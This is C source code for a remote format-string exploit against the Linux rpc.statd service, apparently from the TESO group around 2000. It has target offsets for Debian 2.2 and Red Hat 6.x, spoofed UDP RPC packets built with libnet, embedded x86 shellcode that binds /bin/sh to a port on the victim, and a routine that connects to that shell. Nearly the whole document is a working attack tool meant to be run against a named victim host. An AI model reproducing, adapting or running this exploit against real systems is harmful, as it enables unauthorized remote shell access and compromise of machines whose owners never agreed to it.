/* remote rpc.statd exploit by smiler 
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 * 
 * This is unpublished proprietary source code of TESO Security.
 * 
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * TESO Security.
 * (that includes you hack.co.za)
 *
 * (C) COPYRIGHT TESO Security, 2000
 * All Rights Reserved
 */

#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <sys/types.h>
#include "format.h"

struct type {
	char		*name;
	unsigned long	ret; /* this should point to the start of the buffer */
	unsigned long	ret_locl;
	unsigned int	offset;
	unsigned int	align;
};

#define STATD_PROG 100024
#define STATD_VERS 1
#define STATD_SM_STAT 1

struct type types[]={
	{"my box", 0xbffff002, 0xbffff9f4, 12, 0},/*this dont work anymore :p*/
	{"debian 2.2", 0xbffff334, 0xbffff31c, 12, 0},
	{"redhat 6.2 (Zoot)", 0xbffff314, 0xbffff2fc, 12, 0},
	{"redhat 6.0", 0xbffff334, 0xbffff31c, 12, 0}
};

char exit_shellcode[] = "\x31\xc0\xfe\xc0\xcd\x80";
char port_shellcode[] =
        "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x74\x5f\x89\x4f\x10\xfe"
        "\xc1\x89\x4f\x0c\xfe\xc1\x89\x4f\x08\x8d\x4f\x08\xfe\xc3\xb0"
        "\x66\xcd\x80\xfe\xc3\xc6\x47\x10\x10\x66\x89\x5f\x14\x88\x47"
        "\x08\xb0\x45\x66\x89\x47\x16\x89\x57\x18\x8d\x4f\x14\x89\x4f"
        "\x0c\x8d\x4f\x08\xb0\x66\xcd\x80\x89\x5f\x0c\xfe\xc3\xfe\xc3"
        "\xb0\x66\xcd\x80\x89\x57\x0c\x89\x57\x10\xfe\xc3\xb0\x66\xcd"
        "\x80\x31\xc9\x88\xc3\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80"
        "\xfe\xc1\xb0\x3f\xcd\x80\x88\x57\x07\x89\x7f\x0c\x89\xfb\x8d"
        "\x4f\x0c\xb0\x0b\xcd\x80\xe8\x87\xff\xff\xff/bin/sh";

static int type_cnt = sizeof(types) / sizeof(struct type);

#define TYPE_EXPLOIT 0
#define TYPE_FINDPAD 1
#define TYPE_FINDSTRING 2

char *functions[]=
	{
		"exploit function",
		"find padding function",
		"find string function",
	};

typedef struct attack_info {
	int	rawfd;
	struct in_addr localip, victim;
	struct type * t_ptr;
	int	port;
	char	*shellcode;
	int	type;
} attack_info;

typedef struct rpc_hdr {
	unsigned int	xid;
	unsigned int	msg_type;
	unsigned int	rpc_ver;
	unsigned int	prog;
	unsigned int	vers;
	unsigned int	proc;
} rpc_hdr;

int
build_rpc (unsigned char *buf, unsigned int prog, unsigned int vers, unsigned int proc)
{
	rpc_hdr	h;

	h.xid = random();
	h.msg_type = 0;
	h.rpc_ver = htonl (2);
	h.prog = htonl (prog);
	h.vers = htonl (vers);
	h.proc = htonl (proc);

	memcpy (buf, &h, sizeof(h));
	/* NULL AUTH */
	memset (buf + sizeof(h), 0, 4*4);
	return (sizeof(h) + 4*4);
}

int
cheq_char (int chr)
{
	chr &= 0xff;

	if (chr == '%' || chr == '\x00' || chr == '\r' || chr == '\n')
		return (0);

	return (1);
}

int
cheq_str (char *str, int len)
{
	char *ptr = str + len - 1;

	while (ptr >= str) {
		if (cheq_char (*ptr--) == 0)
			return (-1);
	}

	return (0);
}

/*
 * build exploitation string
 */
int
build_exploit (char *mn, attack_info *at)
{
	char *ptr = mn;
	int cnt_sofar, i;

	cnt_sofar = 24;
	memset (mn, 'B', at->t_ptr->align);
	mn += at->t_ptr->align;
	cnt_sofar += at->t_ptr->align;
	/* add in the return address byte locations */
	i = tf_retloc (mn, at->t_ptr->ret_locl, NULL , cheq_char, &cnt_sofar);
	if (i <= 0) {
		fprintf (stderr, "invalid characters in tf_retloc\n");
		return (-1);
	}
	mn += i;
	
	/* insert the shellcode + nops here */
	memset (mn, 0x90, 100);
	mn += 100;
	cnt_sofar += 100;
	if (cheq_str (at->shellcode, strlen(at->shellcode)) < 0) {
		fprintf (stderr, "invalid characters in shellcode");
		return (-1);
	}
	strcpy (mn, at->shellcode);
	mn += strlen(at->shellcode);
	cnt_sofar += strlen(at->shellcode);

	/* pop onto the beginning of the format string + the initial blurb */
	mn += tf_pad (mn, at->t_ptr->offset + 24, &tf_accurate, &cnt_sofar, -1);

	/* do groovy ret stuff */
	mn += tf_ret (mn, at->t_ptr->ret + 24 + 32 + 8 + 50, &cnt_sofar, -1);

	return (mn - ptr);

}

/*
 * search for the write padding offset
 */

int
build_findpad (char *mn, attack_info *at)
{
	char *ptr = mn;
	int	cnt_sofar;

	fprintf (stderr, "in build_findpad()\n");
	memset (mn, 'X', at->t_ptr->align);
	mn += at->t_ptr->align;
	strcpy (mn, "AAAAAAAABBBBBBBBCCCCCCCC");
	mn += 24;
	mn += tf_pad (mn, at->t_ptr->offset + 24, &tf_efficient,&cnt_sofar, -1);
	strcpy (mn, "|%8x%8x");
	mn += 7;

	return (mn-ptr);
}

/*
 * search for ourselves in memory!
 */

int
build_findstring (char *mn, attack_info *at)
{
	char *ptr = mn;
	int	cnt_sofar;

	memset (mn, 'A', at->t_ptr->align);
	mn += at->t_ptr->align;
	*(unsigned int *)(mn) = at->t_ptr->ret;
	if (tf_cheq_word (mn, cheq_char) == 0)
		return (-1);
	mn += 4;
	/* something to look for */
	strcpy (mn, "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC");
	mn += 32;
	mn += tf_pad (mn, at->t_ptr->offset + 24, &tf_efficient, &cnt_sofar,-1);
	strcpy (mn, "|%24s");
	mn += 5; 

	return (mn - ptr);
}

/*
 * log (L_WARNING, "gethostbyname error for %s", argp->mon_name);
 *  - in the SM_STAT function
 *    this is the simplest function to exploit, as far as i can tell
 */
int
send_exploit (attack_info *at)
{
	char	buf[512], *ptr;
	int		i, totlen;

	ptr = buf + LIBNET_IP_H + LIBNET_UDP_H;
	/* build rpc header */
	ptr += build_rpc (ptr, STATD_PROG, STATD_VERS, STATD_SM_STAT);

	/* build appropriate string */
	switch (at->type) {
	case TYPE_EXPLOIT:
		i = build_exploit (ptr + 4, at);
		break;
	case TYPE_FINDPAD:
		i = build_findpad (ptr + 4, at);
		break;
	case TYPE_FINDSTRING:
		i = build_findstring (ptr + 4, at);
		break;
	default:
		fprintf (stderr, "FUCK\n");
		return (-1);
	}
	if (i < 0) {
		fprintf (stderr, "error building string\n");
		return (-1);
	}

	*(unsigned int *)(ptr) = htonl (i);
	ptr += (i + 4);

	totlen = (ptr - buf) - LIBNET_IP_H - LIBNET_UDP_H;
	printf ("rpc packet len = %d\n", totlen);

	/* build ip header */
	libnet_build_ip
		(
		totlen + LIBNET_UDP_H,
		0, 0, 0, 63, IPPROTO_UDP,
		at->localip.s_addr, at->victim.s_addr,
		NULL, 0,
		buf
		);

	/* build udp header */
	libnet_build_udp
		(
		0x7350, at->port,
		NULL, totlen,
		buf + LIBNET_IP_H
		);

	/* build checksums */
	libnet_do_checksum (buf, IPPROTO_IP, LIBNET_IP_H);
	libnet_do_checksum (buf, IPPROTO_UDP, LIBNET_UDP_H + totlen);

	/* send */
	if (libnet_write_ip (at->rawfd, buf, totlen + LIBNET_IP_H + LIBNET_UDP_H) < 0) {
		perror ("libnet_write_ip");
		return (-1);
	}
	return (0);
}

void
usage (char *prog)
{
	char *ptr;
	int	i;

	ptr = strchr (prog, '/');
	if (ptr)
		prog = ptr + 1;

	fprintf (stderr, "usage: %s <victim> <localip> <port> [options]\n",prog);
	fprintf (stderr,
		"\t\t-t <type>\n" \
		"\t\t-o <padding>\n" \
		"\t\t-r <beginning of buffer>\n" \
		"\t\t-l <ret location>\n" \
		"\t\t-f <packet function>\n" 
		);
	fputc ('\n', stderr);
	for (i = 0; i < type_cnt; i++) {
		fprintf (stderr, "type %d: %s\n", i, types[i].name);
	}
	fputc ('\n', stderr);
	fprintf (stderr, "function 0: exploit\n");
	fprintf (stderr, "function 1: findpad\n");
	fprintf (stderr, "function 2: findstring\n");
}

int
run_portshell (struct in_addr ip)
{
	char	buf[1024];
	struct sockaddr_in sin;
	int	sock, n;
	fd_set	rset, tmp;

	sock = socket (AF_INET, SOCK_STREAM, 0);
	if (sock < 0) { 
		perror ("socket");
		return (-1);
	}

	memset (&sin, 0, sizeof(sin));
	sin.sin_addr.s_addr = ip.s_addr;
	sin.sin_port = htons (17664);
	sin.sin_family = AF_INET;

	if (connect (sock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
		perror ("connect");
		return (-1);
	}

	FD_ZERO (&rset);
	FD_SET (sock, &rset);
	FD_SET (STDIN_FILENO, &rset);
	tmp = rset;
	while (select (sock + 1, &tmp, NULL, NULL, NULL) > 0) {
		if (FD_ISSET (sock, &tmp)) {
			n = read (sock, buf, sizeof(buf));
			if (n <= 0) {
				perror ("read");
				return (-1);
			}
			write (STDOUT_FILENO, buf, n);
		}
		if (FD_ISSET (STDIN_FILENO, &tmp)) {
			n = read (STDIN_FILENO, buf, sizeof(buf));
			if (n <= 0) {
				perror ("read");
				return (-1);
			}
			write (sock, buf, n);
		}

		tmp = rset;
	}
	return (0);
}
int
main (int argc, char **argv)
{
	int	i;
	char	opt;
	char *	argv0 = argv[0];
	attack_info	at;

	fprintf (stderr, "rpc.statd exploit by smiler / teso\n\n");

	at.localip.s_addr = at.victim.s_addr = 0xffffffff;
	at.t_ptr = &types[0];
	at.type = TYPE_EXPLOIT;
	while ((opt = getopt (argc, argv, "t:o:r:l:f:a:")) != -1) {
		switch (opt) {
		case 't':
			i = atoi (optarg);
			if (i >= type_cnt || i < 0) {
				fprintf (stderr, "bad type\n");
				usage (argv0);
				return (EXIT_FAILURE);
			}
			at.t_ptr = &types[i];
			break;
		case 'a':
			(at.t_ptr)->align = atoi (optarg);
			break;
		case 'o':
			(at.t_ptr)->offset = atoi (optarg);
			break;
		case 'l':
			(at.t_ptr)->ret_locl += atoi (optarg);
			break;
		case 'r':
			(at.t_ptr)->ret += atoi (optarg);
			break;
		case 'f':
			at.type = atoi (optarg);
			if (at.type < 0 || at.type > 2) {
				fprintf (stderr, "invalid function\n");
				return (EXIT_FAILURE);
			}
		}
	}

	argc -= optind;
	argv += optind;
	if (argc < 3) {
		usage (argv0);
		return (EXIT_FAILURE);
	}

	at.shellcode = port_shellcode;

	fprintf (stderr, "using type - %s\n\n", at.t_ptr->name);
	fprintf (stderr, "pad offset = %d\n", at.t_ptr->offset);
	fprintf (stderr, "alignment =  %d\n", at.t_ptr->align);
	fprintf (stderr, "ret location = %X\n", (u_int)at.t_ptr->ret_locl);
	fprintf (stderr, "start of buffer = %X\n", (u_int)at.t_ptr->ret);
	fprintf (stderr, "function = %s\n", functions[at.type]);

	at.victim.s_addr = libnet_name_resolve (argv[0], 1);
	if (at.victim.s_addr == 0) {
		herror ("libnet_name_resolve");
		return (EXIT_FAILURE);
	}

	at.localip.s_addr = libnet_name_resolve (argv[1], 1);
	if (at.localip.s_addr == 0) {
		herror ("libnet_name_resolve");
		return (EXIT_FAILURE);
	}

	at.port = atoi (argv[2]);
	if (at.port == 0) {
		usage (argv0);
		return (EXIT_FAILURE);
	}

	fprintf (stderr, "victim = %s\n", inet_ntoa (at.victim));
	fprintf (stderr, "local_ip = %s\n\n", inet_ntoa (at.localip));

	at.rawfd = libnet_open_raw_sock (IPPROTO_RAW);
	if (at.rawfd < 0) {
		perror ("open_raw_sock");
		return (EXIT_FAILURE);
	}

	send_exploit (&at);
	close (at.rawfd);
	if (at.type != TYPE_EXPLOIT)
		return (EXIT_SUCCESS);

	printf ("Sleeping for 2 seconds...\n");
	sleep (2);
	printf ("Connecting to portshell...\n");
	run_portshell (at.victim);
	return (EXIT_SUCCESS);
}
